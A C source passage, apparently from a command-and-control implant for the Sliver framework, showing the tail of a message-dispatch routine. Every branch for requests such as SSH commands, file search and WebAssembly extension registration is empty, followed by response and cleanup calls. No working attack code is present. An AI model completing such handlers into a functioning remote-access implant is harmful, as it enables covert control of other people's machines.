	else if (pEnvelope->uType == MsgReconfigureReq) {
	
	}
	else if (pEnvelope->uType == MsgSSHCommandReq) {
	
	}
	else if (pEnvelope->uType == MsgChtimesReq) {
	
	}
	else if (pEnvelope->uType == MsgGrepReq) {
	
	}
	else if (pEnvelope->uType == MsgRegisterExtensionReq) {
	
	}
	else if (pEnvelope->uType == MsgCallExtensionReq) {
	
	}
	else if (pEnvelope->uType == MsgListExtensionsReq) {
	
	}
	else if (pEnvelope->uType == MsgRegisterWasmExtensionReq) {
	
	}
	else if (pEnvelope->uType == MsgDeregisterWasmExtensionReq) {
	
	}
	else if (pEnvelope->uType == MsgListWasmExtensionsReq) {

	}
	else {

	}

	WriteEnvelope(pWrapper->pSliverClient, pResp);
	FreeEnvelope(pResp);
	FreeEnvelope(pEnvelope);
	FREE(pWrapper);

	return;
}

